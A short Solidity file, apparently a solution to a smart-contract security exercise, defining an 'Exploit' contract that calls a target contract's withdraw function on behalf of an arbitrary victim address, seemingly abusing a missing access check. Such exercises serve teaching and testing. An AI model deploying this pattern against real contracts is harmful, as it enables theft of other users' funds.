pragma solidity ^0.8.0;

contract Exploit {
    Exercise_1 target;

    constructor(address _target) {
        target = Exercise_1(_target);
    }

    function exploit(address victim, uint256 amount) public {
        target.withdraw(victim, amount);
    }
}
